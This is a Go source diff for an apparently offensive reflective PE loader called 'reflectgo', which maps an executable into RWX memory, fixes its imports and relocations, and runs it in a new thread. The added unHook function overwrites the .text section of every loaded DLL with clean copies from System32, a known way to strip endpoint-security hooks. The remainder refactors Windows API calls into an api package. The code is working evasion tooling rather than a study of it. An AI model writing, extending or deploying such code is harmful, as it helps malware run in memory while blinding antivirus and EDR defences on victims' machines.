@@ -10,6 +10,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"reflectgo/api"
 	"reflectgo/utils"
 	"strings"
 	"syscall"
@@ -51,6 +52,11 @@ func (pe *PeData) Exec() error {
 		return err
 	}
 
+	err = pe.unHook()
+	if err != nil {
+		return err
+	}
+
 	err = pe.fixAgrs()
 	if err != nil {
 		return err
@@ -62,6 +68,128 @@ func (pe *PeData) Exec() error {
 
 func nop() {
 	fmt.Printf("")
+}
+
+func (pe *PeData) unHook() error {
+	pe.log("unHook", pe.file)
+	modules, err := api.FindAllDLL(uintptr(windows.GetCurrentProcessId()))
+	if err != nil {
+		return err
+	}
+
+	for _, module := range modules {
+		pe.log("\trestore", module)
+		pe.restoreDLL(pe.currentProcess, module)
+	}
+	return nil
+}
+
+func (pe *PeData) restoreDLL(currentProcess windows.Handle, module string) error {
+	libHandler, err := windows.LoadLibrary(module)
+	if err != nil {
+		return errors.New("LoadLibrary" + module + " err: " + err.Error())
+	}
+
+	var libInfo windows.ModuleInfo
+	err = windows.GetModuleInformation(currentProcess, libHandler, &libInfo, uint32(unsafe.Sizeof(libInfo)))
+	if err != nil {
+		return errors.New("GetModuleInformation" + module + " err: " + err.Error())
+	}
+
+	var pbi api.PROCESS_BASIC_INFORMATION
+	pbiLen := uint32(unsafe.Sizeof(pbi))
+	err = windows.NtQueryInformationProcess(currentProcess, windows.ProcessBasicInformation, unsafe.Pointer(&pbi), pbiLen, nil)
+	if err != nil {
+		return errors.New("NtQueryInformationProcess" + module + " err: " + err.Error())
+	}
+
+	var peb windows.PEB
+	s := uintptr(unsafe.Sizeof(peb))
+	err = windows.ReadProcessMemory(currentProcess, pbi.PebBaseAddress, (*byte)(unsafe.Pointer(&peb)), s, nil)
+	if err != nil {
+		return errors.New("ReadProcessMemory peb err: " + err.Error())
+	}
+
+	var pImageHeader api.IMAGE_DOS_HEADER
+	s = uintptr(unsafe.Sizeof(pImageHeader))
+	err = windows.ReadProcessMemory(currentProcess, libInfo.BaseOfDll, (*byte)(unsafe.Pointer(&pImageHeader)), s, nil)
+	if err != nil {
+		return errors.New("ReadProcessMemory pImageHeader err: " + err.Error())
+	}
+
+	ntHeaderOffset := pImageHeader.E_lfanew
+	var pOldNtHeader api.IMAGE_NT_HEADERS
+	s = uintptr(unsafe.Sizeof(pOldNtHeader))
+	err = windows.ReadProcessMemory(currentProcess, libInfo.BaseOfDll+uintptr(ntHeaderOffset), (*byte)(unsafe.Pointer(&pOldNtHeader)), s, nil)
+	if err != nil {
+		return errors.New("ReadProcessMemory pOldNtHeader err: " + err.Error())
+	}
+
+	sectionHeaderOffset := uint16(uintptr(pImageHeader.E_lfanew) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.Signature) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.FileHeader) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.OptionalHeader))
+	var sectionHeader api.ImageSectionHeader
+	const sectionHeaderSize = unsafe.Sizeof(sectionHeader)
+	for i := api.WORD(0); i != pOldNtHeader.FileHeader.NumberOfSections; i++ {
+		err = windows.ReadProcessMemory(currentProcess, libInfo.BaseOfDll+uintptr(sectionHeaderOffset), (*byte)(unsafe.Pointer(&sectionHeader)), sectionHeaderSize, nil)
+		if err != nil {
+			return errors.New("ReadProcessMemory sectionHeader err: " + err.Error())
+		}
+		var secName []byte
+		for _, b := range sectionHeader.Name {
+			if b == 0 {
+				break
+			}
+			secName = append(secName, byte(b))
+		}
+
+		if string(secName) == ".text" {
+			dllPath := "C:\\Windows\\System32\\" + module
+			if _, err := os.Stat(dllPath); err == nil {
+				f, err := os.Open(dllPath)
+				if err != nil {
+					return errors.New("Open " + dllPath + " err: " + err.Error())
+				}
+				defer f.Close()
+				// p, err := syscall.UTF16PtrFromString("C:\\Windows\\System32\\" + module)
+				// if err != nil {
+				// 	panic(err)
+				// }
+				// h, err := syscall.CreateFile(p, windows.GENERIC_READ, windows.FILE_SHARE_READ, nil, syscall.OPEN_EXISTING, 0, 0)
+				// if err != nil {
+				// 	panic(err)
+				// }
+
+				h, err := syscall.CreateFileMapping(syscall.Handle(f.Fd()), nil, syscall.PAGE_READONLY|0x01000000, 0, 0, nil)
+				if h == 0 {
+					return errors.New("CreateFileMapping err: " + err.Error())
+				}
+
+				addr, err := syscall.MapViewOfFile(h, syscall.FILE_MAP_READ, 0, 0, 0)
+				if addr == 0 {
+					return errors.New("MapViewOfFile err: " + err.Error())
+				}
+
+				originDllData := (*byte)(unsafe.Pointer(addr + uintptr(sectionHeader.VirtualAddress)))
+				var oldProtect uint32
+				err = windows.VirtualProtect(libInfo.BaseOfDll+uintptr(sectionHeader.VirtualAddress), uintptr(sectionHeader.PhysicalAddressOrVirtualSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
+				if err != nil {
+					return errors.New("VirtualProtect err: " + err.Error())
+				}
+
+				err = windows.WriteProcessMemory(currentProcess, libInfo.BaseOfDll+uintptr(sectionHeader.VirtualAddress), originDllData, uintptr(sectionHeader.PhysicalAddressOrVirtualSize), nil)
+				if err != nil {
+					return errors.New("WriteProcessMemory err: " + err.Error())
+				}
+
+				err = windows.VirtualProtect(libInfo.BaseOfDll+uintptr(sectionHeader.VirtualAddress), uintptr(sectionHeader.PhysicalAddressOrVirtualSize), oldProtect, &oldProtect)
+				if err != nil {
+					return errors.New("VirtualProtect err: " + err.Error())
+				}
+			}
+			break
+		}
+		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)
+	}
+	return nil
 }
 
 func (pe *PeData) loadPe() error {
@@ -83,7 +211,7 @@ func (pe *PeData) loadPe() error {
 		}
 	}
 
-	var pImageHeader IMAGE_DOS_HEADER
+	var pImageHeader api.IMAGE_DOS_HEADER
 	rdrBytes := bytes.NewReader(pSourceBytes)
 	err = binary.Read(rdrBytes, binary.LittleEndian, &pImageHeader)
 	if err != nil {
@@ -92,7 +220,7 @@ func (pe *PeData) loadPe() error {
 
 	ntHeaderOffset := pImageHeader.E_lfanew
 
-	var pOldNtHeader = new(IMAGE_NT_HEADERS)
+	var pOldNtHeader = new(api.IMAGE_NT_HEADERS)
 	rdrBytes = bytes.NewReader(pSourceBytes[ntHeaderOffset:])
 	err = binary.Read(rdrBytes, binary.LittleEndian, pOldNtHeader)
 	if err != nil {
@@ -100,25 +228,25 @@ func (pe *PeData) loadPe() error {
 	}
 
 	oldPeAddress := pOldNtHeader.OptionalHeader.ImageBase
-	pImageBase := VirtualAlloc(uintptr(oldPeAddress), int(pOldNtHeader.OptionalHeader.SizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	pImageBase := api.VirtualAlloc(uintptr(oldPeAddress), int(pOldNtHeader.OptionalHeader.SizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	if pImageBase == 0 {
 		nop()
-		pImageBase = VirtualAlloc(uintptr(0), int(pOldNtHeader.OptionalHeader.SizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+		pImageBase = api.VirtualAlloc(uintptr(0), int(pOldNtHeader.OptionalHeader.SizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	}
-	pOldNtHeader.OptionalHeader.ImageBase = ULONGLONG(pImageBase)
+	pOldNtHeader.OptionalHeader.ImageBase = api.ULONGLONG(pImageBase)
 	pe.log("ImageBase at", unsafe.Pointer(pImageBase))
 
 	//write header
 	nop()
-	WriteMemory(pImageBase, pSourceBytes, uintptr(pOldNtHeader.OptionalHeader.SizeOfHeaders))
+	api.WriteMemory(pImageBase, pSourceBytes, uintptr(pOldNtHeader.OptionalHeader.SizeOfHeaders))
 
-	sectionHeaderOffset := uint16(uintptr(pImageHeader.E_lfanew) + unsafe.Sizeof(IMAGE_NT_HEADERS{}.Signature) + unsafe.Sizeof(IMAGE_NT_HEADERS{}.FileHeader) + unsafe.Sizeof(IMAGE_NT_HEADERS{}.OptionalHeader))
-	var sectionHeader IMAGE_SECTION_HEADER
+	sectionHeaderOffset := uint16(uintptr(pImageHeader.E_lfanew) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.Signature) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.FileHeader) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.OptionalHeader))
+	var sectionHeader api.IMAGE_SECTION_HEADER
 	const sectionHeaderSize = unsafe.Sizeof(sectionHeader)
 
 	// write all sections
 	pe.log("Write Section")
-	for i := WORD(0); i != pOldNtHeader.FileHeader.NumberOfSections; i++ {
+	for i := api.WORD(0); i != pOldNtHeader.FileHeader.NumberOfSections; i++ {
 		rdrBytes = bytes.NewReader(pSourceBytes[sectionHeaderOffset:])
 		err = binary.Read(rdrBytes, binary.LittleEndian, &sectionHeader)
 		if err != nil {
@@ -133,15 +261,15 @@ func (pe *PeData) loadPe() error {
 			secName = append(secName, byte(b))
 		}
 		pe.log("\tSection", string(secName))
-		WriteMemory(pImageBase+uintptr(sectionHeader.VirtualAddress), pSourceBytes[sectionHeader.PointerToRawData:], uintptr(sectionHeader.SizeOfRawData))
+		api.WriteMemory(pImageBase+uintptr(sectionHeader.VirtualAddress), pSourceBytes[sectionHeader.PointerToRawData:], uintptr(sectionHeader.SizeOfRawData))
 		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)
 	}
 
 	//fix IAT
 	pe.log("Fix Import Table")
 	iatSize := uintptr(pOldNtHeader.OptionalHeader.DataDirectory[1].Size)
-	for parsedSize := uintptr(0); parsedSize < iatSize; parsedSize += unsafe.Sizeof(IMAGE_IMPORT_DESCRIPTOR{}) {
-		importDesc := (*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(pImageBase + parsedSize + uintptr(pOldNtHeader.OptionalHeader.DataDirectory[1].VirtualAddress)))
+	for parsedSize := uintptr(0); parsedSize < iatSize; parsedSize += unsafe.Sizeof(api.IMAGE_IMPORT_DESCRIPTOR{}) {
+		importDesc := (*api.IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(pImageBase + parsedSize + uintptr(pOldNtHeader.OptionalHeader.DataDirectory[1].VirtualAddress)))
 		if importDesc.OriginalFirstThunk == 0 && importDesc.FirstThunk == 0 {
 			break
 		}
@@ -156,8 +284,8 @@ func (pe *PeData) loadPe() error {
 		offsetThunk := uintptr(0)
 		offsetField := uintptr(0)
 		for {
-			fieldThunk := (*IMAGE_THUNK_DATA64)(unsafe.Pointer(pImageBase + offsetField + uintptr(importDesc.FirstThunk)))
-			orginThunk := (*IMAGE_THUNK_DATA64)(unsafe.Pointer(pImageBase + offsetThunk + uintptr(importDesc.OriginalFirstThunk)))
+			fieldThunk := (*api.IMAGE_THUNK_DATA64)(unsafe.Pointer(pImageBase + offsetField + uintptr(importDesc.FirstThunk)))
+			orginThunk := (*api.IMAGE_THUNK_DATA64)(unsafe.Pointer(pImageBase + offsetThunk + uintptr(importDesc.OriginalFirstThunk)))
 			if fieldThunk.AddressOfData == 0 {
 				break
 			}
@@ -169,7 +297,7 @@ func (pe *PeData) loadPe() error {
 				proc = uintptr(unsafe.Pointer(uintptr(orginThunk.AddressOfData)))
 				funcName = fmt.Sprintf("%x", orginThunk.AddressOfData)
 			} else {
-				byName := (*PIMAGE_IMPORT_BY_NAME)(unsafe.Pointer(pImageBase + uintptr(fieldThunk.AddressOfData)))
+				byName := (*api.PIMAGE_IMPORT_BY_NAME)(unsafe.Pointer(pImageBase + uintptr(fieldThunk.AddressOfData)))
 				funcName = windows.BytePtrToString(&byName.Name)
 				proc, err = windows.GetProcAddress(libHandler, funcName)
 				if err != nil {
@@ -178,7 +306,7 @@ func (pe *PeData) loadPe() error {
 			}
 
 			pe.log(fmt.Sprintf("\tFix %s to %v", funcName, proc))
-			fieldThunk.AddressOfData = ULONGLONG(proc)
+			fieldThunk.AddressOfData = api.ULONGLONG(proc)
 			offsetThunk += unsafe.Sizeof(orginThunk)
 			offsetField += unsafe.Sizeof(fieldThunk)
 		}
@@ -238,7 +366,7 @@ func (pe *PeData) fixAgrs() error {
 		"GetCommandLineW",
 		"GetCommandLineA",
 	} {
-		funcGetCommandLineXAddr, err := kernelbase.FindProc(cmd)
+		funcGetCommandLineXAddr, err := api.Kernelbase.FindProc(cmd)
 		if err != nil {
 			return errors.New("find " + cmd + " address error: " + err.Error())
 		}
@@ -267,37 +395,37 @@ func (pe *PeData) fixAgrs() error {
 	return nil
 }
 
-func (pe *PeData) fixRelocTable(newAddr uintptr, oldAddr uintptr, relocDir *IMAGE_DATA_DIRECTORY) error {
+func (pe *PeData) fixRelocTable(newAddr uintptr, oldAddr uintptr, relocDir *api.IMAGE_DATA_DIRECTORY) error {
 	pe.log("Fix RelocTable:", newAddr, oldAddr)
 	maxSize := relocDir.Size
 	relocAddr := relocDir.VirtualAddress
-	var reloc = &IMAGE_BASE_RELOCATION{}
+	var reloc = &api.IMAGE_BASE_RELOCATION{}
 	delta := newAddr - oldAddr
 	process := uintptr(pe.currentProcess)
 
 	for parsedSize := uintptr(0); parsedSize < uintptr(maxSize); parsedSize += uintptr(reloc.SizeOfBlock) {
-		reloc = (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocAddr) + parsedSize + newAddr))
+		reloc = (*api.IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocAddr) + parsedSize + newAddr))
 		if reloc.VirtualAdress == 0 || reloc.SizeOfBlock == 0 {
 			break
 		}
 
-		entriesNum := int((uintptr(reloc.SizeOfBlock) - unsafe.Sizeof(IMAGE_BASE_RELOCATION{})) / unsafe.Sizeof(BASE_RELOCATION_ENTRY{}))
+		entriesNum := int((uintptr(reloc.SizeOfBlock) - unsafe.Sizeof(api.IMAGE_BASE_RELOCATION{})) / unsafe.Sizeof(api.BASE_RELOCATION_ENTRY{}))
 		pageAddr := reloc.VirtualAdress
-		entry := (*BASE_RELOCATION_ENTRY)(unsafe.Pointer((uintptr(unsafe.Pointer(reloc)) + unsafe.Sizeof(IMAGE_BASE_RELOCATION{}))))
+		entry := (*api.BASE_RELOCATION_ENTRY)(unsafe.Pointer((uintptr(unsafe.Pointer(reloc)) + unsafe.Sizeof(api.IMAGE_BASE_RELOCATION{}))))
 		for i := 0; i < entriesNum; i++ {
 			var relocationAddr = uintptr(pageAddr) + uintptr(newAddr) + uintptr(entry.Offset())
-			readAddr, err := ReadProcessMemoryAsAddr(process, relocationAddr)
+			readAddr, err := api.ReadProcessMemoryAsAddr(process, relocationAddr)
 			if err != nil {
 				return fmt.Errorf("read memory as addr error: %v\n", err)
 			}
 			readAddr += delta
 
-			err = WriteProcessMemoryAsAddr(process, relocationAddr, readAddr)
+			err = api.WriteProcessMemoryAsAddr(process, relocationAddr, readAddr)
 			if err != nil {
 				return fmt.Errorf("write memory as addr error: %v\n", err)
 			}
 
-			entry = (*BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) + unsafe.Sizeof(BASE_RELOCATION_ENTRY{})))
+			entry = (*api.BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) + unsafe.Sizeof(api.BASE_RELOCATION_ENTRY{})))
 		}
 	}
 	return nil
@@ -305,9 +433,9 @@ func (pe *PeData) fixRelocTable(newAddr uintptr, oldAddr uintptr, relocDir *IMAG
 
 func (pe *PeData) execAsm() error {
 	// syscall.Syscall(pe.startAddress, 0, 0, 0, 0)
-	thread := CreateThread(pe.startAddress)
+	thread := api.CreateThread(pe.startAddress)
 	nop()
-	return WaitForSingleObject(thread, 0xFFFFFFFF)
+	return api.WaitForSingleObject(thread, 0xFFFFFFFF)
 }
 
 func (pe *PeData) log(message ...interface{}) {
@@ -360,12 +488,12 @@ func getPassword() (text string, err error) {
 	}
 	modeOff = modeOn &^ 0x0004
 	fmt.Printf("password:")
-	_, _, _ = procSetConsoleMode.Call(uintptr(stdin), uintptr(modeOff))
+	_, _, _ = api.ProcSetConsoleMode.Call(uintptr(stdin), uintptr(modeOff))
 	_, err = fmt.Scanln(&text)
 	if err != nil {
 		return
 	}
-	_, _, _ = procSetConsoleMode.Call(uintptr(stdin), uintptr(modeOn))
+	_, _, _ = api.ProcSetConsoleMode.Call(uintptr(stdin), uintptr(modeOn))
 	fmt.Println()
 	return strings.TrimSpace(text), nil
 }
